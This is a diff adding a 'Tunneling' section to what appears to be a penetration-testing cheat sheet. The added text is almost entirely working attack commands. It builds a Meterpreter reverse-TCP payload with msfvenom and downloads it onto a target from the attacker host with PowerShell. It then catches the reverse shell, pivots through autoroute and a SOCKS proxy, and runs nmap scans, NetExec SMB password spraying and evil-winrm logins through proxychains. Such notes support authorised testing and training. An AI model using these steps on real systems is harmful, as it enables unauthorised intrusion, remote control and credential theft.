@@ -219,3 +219,52 @@ $ sudo msfconsole -r mymsfscript.rc
 PS > .\met.exe
 ```
 
+## Tunneling
+
+On Kali, build a Meterpreter payload:
+```
+msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=$AttIP LPORT=$AttPort -f exe -o met.exe
+```
+and download it on the DMZ target:
+```
+PS > iwr -uri http://$IpAttacker/met.exe -outfile met.exe
+```
+
+Trigger a reverse shell in a multi-handler:
+```
+use multi/handler
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST $IpAttacker
+set LPORT 443 # or 4444
+set ExitOnSession false
+run -j
+```
+
+In the remote shell, execute the Meterpreter:
+```
+PS > .\met.exe
+```
+
+then configure the routing:
+```
+use multi/manage/autoroute
+set session 1
+run
+use auxiliary/server/socks_proxy
+set SRVHOST 127.0.0.1
+set VERSION 5
+run -j
+```
+
+check the proxy config (default port is `1080`):
+```
+$ cat /etc/proxychains4.conf
+```
+
+and enumerate:
+```
+sudo proxychains -q nmap -vvv -sT -n -Pn -T4 -p 22,139,445 a.b.c.d1-d2
+proxychains -q NetExec smb $IP -u xx -p 'yy' -d someorg.com --shares
+proxychains -q NetExec smb ./targets.txt -u ./users.txt -p ./passwords.txt -d someorg.com --shares
+proxychains -q evil-winrm -i $IP -u xx -p 'yy'
+```
